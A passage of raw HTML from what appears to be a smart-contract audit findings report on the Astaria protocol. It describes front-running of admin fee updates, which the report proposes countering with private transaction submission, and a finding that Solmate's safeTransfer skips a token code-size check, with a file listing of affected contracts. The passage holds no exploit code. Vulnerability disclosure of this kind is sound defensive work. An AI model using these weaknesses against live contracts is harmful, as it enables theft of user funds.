class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">StrategyValidator</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TYPE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategyValidators</span><span class=\"mtk1\">[</span><span class=\"mtk12\">TYPE</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UnsupportedFile</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FileUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">what</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>For example, the adversary detects that the admin wants to make the liquidation fee lower, the adversary can front-run admins’ transaction by settling the liquidation and the liquidation fee payout before the admin’s transaction is executed.</p>\n<h3 id=\"recommended-mitigation-steps-60\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-60\" aria-label=\"recommended mitigation steps 60 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol use private RPC such as flashbot to submit transaction to avoid front-running.</p>\n<h2 id=\"11-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\" style=\"position:relative;\"><a href=\"#11-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\" aria-label=\"11 solmate safetransfer and safetransferfrom does not check the codesize of the token address which may lead to fund loss permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/113\">[11] Solmate safeTransfer and safeTransferFrom does not check the codesize of the token address, which may lead to fund loss</a></h2>\n<p>Solmate safetransferFrom doesn’t check the existence of code at the token address, all contract below that use SafeTransferLib and all safeTransfer and safeTransferFrom has the issue below. <em>(See warden’s <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/113\">original submission</a> for the impacted function and LOC)</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"195\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">gpl</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">solmate</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">gpl</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Cloned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20Cloned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">13</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">gpl</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626Router</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626Router</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC4626Router</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC4626RouterBase</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">13</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">14</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">gpl</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626RouterBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626RouterBase</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IERC4626RouterBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Multicall</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">13</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">seaport</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">solmate</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">solmate</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk1\">  </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">56</span><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">57</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">58</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeCastLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ClearingHouse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">33</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bytes32AddressLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">34</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">35</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">69</span><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">70</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">71</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CollateralLookup</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">47</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeCastLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">48</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">49</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">49</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">50</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">51</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeCastLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">TransferProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">  </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TransferProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Auth</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ITransferProxy</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">22</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">23</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">25</span><span class=\"mtk1\">  </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">26</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">27</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">38</span><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">39</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">40</span><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeCastLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">37</span><span class=\"mtk1\">  </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WithdrawVaultBase</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">38</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">39</span><span class=\"mtk1\">    </span><span 